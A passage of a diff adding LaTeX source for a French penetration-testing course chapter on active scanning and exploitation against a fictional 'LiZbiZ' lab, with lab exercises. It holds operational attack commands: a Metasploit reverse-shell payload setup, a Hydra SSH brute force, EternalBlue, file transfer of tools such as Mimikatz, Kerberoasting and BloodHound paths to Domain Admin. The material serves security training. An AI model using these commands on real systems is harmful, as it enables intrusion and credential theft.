+use exploit/multi/http/apache_mod_jpeg_overflow
+# 3. Configurer la cible
+set RHOSTS 192.168.1.10
+set PAYLOAD php/meterpreter/reverse_tcp
+# 4. Lancer l'attaque
+exploit
+\end{lstlisting}
+
+\subsection{Exploitation de Services Connus}
+
+\begin{itemize}
+    \item \textbf{SSH (Port 22) :} Souvent protégé par mot de passe faible. Utilisation de \texttt{Hydra} pour le Brute Force.
+    \begin{lstlisting}[language=bash]
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
+    \end{lstlisting}
+    \item \textbf{SMB (Port 445) :} Cible privilégiée. Exploitation de failles comme \textbf{EternalBlue (MS17-010)} ou \textbf{BlueKeep}.
+\end{itemize}
+
+\begin{boxlizbiz}
+\textbf{Scénario LiZbiZ :}
+Le scan a révélé un serveur Windows Server 2012 R2 non mis à jour (Port 445 ouvert).
+L'attaquant utilise le module Metasploit \texttt{exploit/windows/smb/ms17\_010\_eternalblue}.
+\textbf{Résultat :} Un shell "SYSTEM" (Administrateur maximum) est ouvert sur le serveur, donnant le contrôle total de la machine.
+\end{boxlizbiz}
+
+% ------------------------------------------------------------------------------
+\section{Transfert de Fichiers (Post-Exploitation)}
+% ------------------------------------------------------------------------------
+
+Une fois un accès obtenu, il faut souvent uploader des outils (Mimikatz, scripts) sur la cible.
+
+\begin{itemize}
+    \item \textbf{Serveur HTTP simple :} \texttt{python3 -m http.server 8080} sur la machine attaquante, puis \texttt{wget} ou \texttt{certutil} sur la cible.
+    \item \textbf{Netcat :} Transfert direct via socket.
+\end{itemize}
+}.
+\end{boxlizbiz}
+
+\subsection{Nuclei, Scanner de Templates}
+\label{subsec:nuclei}
+
+\termecle{Nuclei} (ProjectDiscovery) est un scanner de vulnérabilités moderne
+basé sur des templates \sigle{YAML} communautaires. Il est plus léger et plus
+personnalisable que Nessus pour les tests ciblés.
+
+\begin{lstlisting}[language=bash, caption={Scan Nuclei ciblé}]
+# Mise a jour des templates
+nuclei -update-templates
+
+# Scan sur une cible avec templates CVE
+nuclei -u http://203.0.113.10 -t cves/ -severity critical,high
+
+# Scan sur les templates de mauvaise configuration
+nuclei -u http://203.0.113.10 -t misconfigurations/ -t exposures/
+
+# Scan reseau complet
+nuclei -l hotes_actifs.txt -t network/ -t cves/ -o nuclei_lizbiz.txt
+\end{lstlisting}
+
+% ==============================================================================
+\section{Synthèse : Tableau de Bord Scanning LiZbiZ}
+\label{sec:synthese_scanning}
+% ==============================================================================
+
+\begin{table}[htbp]
+\centering
+\caption{Synthèse du scanning, résultats LiZbiZ et vecteurs d'exploitation}
+\label{tab:synthese_scanning}
+\begin{tabular}{p{2.8cm}p{2.5cm}p{3cm}p{5cm}}
+\toprule
+\textbf{Cible} & \textbf{Port / Service} & \textbf{Version} & \textbf{Vecteur d'exploitation} \\
+\midrule
+203.0.113.10
+    & 80/HTTP
+    & Apache 2.2.22
+    & CVE-2012-0031 (RCE) → Chap.~\ref{chap:exploit} \\
+\addlinespace
+203.0.113.10
+    & 80/HTTP
+    & PHP application
+    & Injection SQL (login) → Chap.~\ref{chap:exploit} \\
+\addlinespace
+192.168.10.50
+    & 80/HTTP
+    & Intranet LiZbiZ
+    & \texttt{/backup/old\_passwd.txt} → brute force \\
+\addlinespace
+192.168.10.20
+    & 445/SMB
+    & Windows Server 2012 R2
+    & MS17-010 EternalBlue → Chap.~\ref{chap:exploit} \\
+\addlinespace
+192.168.10.5
+    & 389/LDAP
+    & Active Directory
+    & Anonymous bind + 3 SPN (Kerberoasting) \\
+\addlinespace
+192.168.10.5
+    & 88/Kerberos
+    & Windows Server 2019
+    & AS-REP Roasting (comptes sans pré-auth) \\
+\addlinespace
+192.168.10.50
+    & 25/SMTP
+    & Postfix 3.x
+    & VRFY user enumeration → liste comptes \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\begin{boxlizbiz}
+\textbf{Bilan du scanning LiZbiZ :}
+
+La phase de scanning actif a transformé la carte de surface d'attaque
+construite en \sigle{OSINT} en un inventaire précis de vecteurs exploitables :
+\begin{enumerate}
+    \item \textbf{Entrée externe} : Apache~2.2.22 (CVE) + injection SQL
+          sur le formulaire de connexion → accès au serveur \sigle{DMZ}.
+    \item \textbf{Mouvement latéral} : EternalBlue sur le serveur Windows
+          interne → shell \sigle{SYSTEM}.
+    \item \textbf{Accès à l'AD} : LDAP anonymous bind → cartographie
+          complète + 3 comptes \sigle{SPN} pour Kerberoasting.
+\end{enumerate}
+Ces trois vecteurs constituent le scénario d'attaque du
+Chapitre~\ref{chap:exploit}.
+\end{boxlizbiz}
+
+% ==============================================================================
+\section*{Points Clés à Retenir}
+% ==============================================================================
+
+\begin{boxinfo}
+\textbf{Ce qu'il faut retenir de ce chapitre :}
+\begin{enumerate}
+    \item Le scanning \textbf{génère du trafic} vers la cible et doit être
+          mené dans les plages horaires des \sigle{ROE}.
+    \item Le \textbf{SYN Scan} (\texttt{-sS}) est le standard : furtif,
+          rapide, nécessite root.
+    \item \textbf{Nmap} détecte l'\sigle{OS} via 7 critères TCP/IP
+          (ISN, Window Size, TTL, DF bit…), pas par magie.
+    \item Les \textbf{scripts NSE} (\texttt{-sC}, \texttt{--script=vuln})
+          démultiplient la valeur d'un scan Nmap sans effort supplémentaire.
+    \item L'énumération \textbf{LDAP/AD} avec un compte standard révèle
+          une quantité massive d'informations exploitables.
+    \item \textbf{Masscan} pour la vitesse, \textbf{Nmap} pour la précision :
+          les deux sont complémentaires.
+    \item Tout résultat de scan doit être \textbf{sauvegardé} (\texttt{-oA})
+          avec hash SHA-256 pour la chaîne de custody.
+\end{enumerate}
+\end{boxinfo}
+
+% ==============================================================================
+\section*{Exercices Pratiques}
+% ==============================================================================
+
+\begin{boxexo}
+\textbf{Exercice 4.1, Scan complet du lab LiZbiZ}
+
+\medskip
+\textbf{Prérequis :} Lab déployé (Exercice~1.1), Kali Linux opérationnelle.
+
+\medskip
+\textbf{Tâches :}
+\begin{enumerate}
+    \item Lancer une découverte d'hôtes sur \texttt{192.168.10.0/24} et
+          \texttt{203.0.113.0/24}.
+    \item Effectuer un scan \sigle{SYN} complet (\texttt{-p-}) sur les
+          hôtes découverts, avec détection de version et scripts par défaut.
+    \item Identifier manuellement les services Apache, SMB, LDAP et SMTP.
+    \item Lancer \texttt{nikto} sur le serveur web et analyser le rapport.
+    \item Lancer \texttt{enum4linux-ng -A} sur le serveur Windows et
+          identifier les partages accessibles.
+    \item Sauvegarder tous les résultats en format \texttt{-oA} et calculer
+          leurs hashes SHA-256.
+\end{enumerate}
+
+\medskip
+\textbf{Livrable :} Tableau des ports ouverts + versions + CVE associées
+(format du Tableau~\ref{tab:synthese_scanning}).
+\end{boxexo}
+
+\begin{boxexo}
+\textbf{Exercice 4.2, Énumération Active Directory avec le compte stagiaire}
+
+\medskip
+\textbf{Prérequis :} Compte \texttt{stagiaire / Password123} fourni dans
+les ROE.
+
+\medskip
+\textbf{Tâches :}
+\begin{enumerate}
+    \item Effectuer une requête \sigle{LDAP} pour lister tous les utilisateurs
+          du domaine \texttt{lizbiz.local}.
+    \item Identifier les comptes de service avec \sigle{SPN} configuré
+          (cibles Kerberoasting, sera exploité au
+          Chapitre~\ref{chap:postexploit}).
+    \item Utiliser \texttt{kerbrute} pour valider la liste d'utilisateurs
+          collectée en \sigle{OSINT}.
+    \item Lancer BloodHound-python en collecte \texttt{-c all} et importer
+          le résultat dans BloodHound.
+    \item Identifier le chemin le plus court vers \og{}Domain Admin\fg{}
+          depuis le compte stagiaire.
+\end{enumerate}
+
+\medskip
+\textbf{Livrable :} Capture d'écran du graphe BloodHound + liste des
+3 SPN identifiés.
+\end{boxexo}
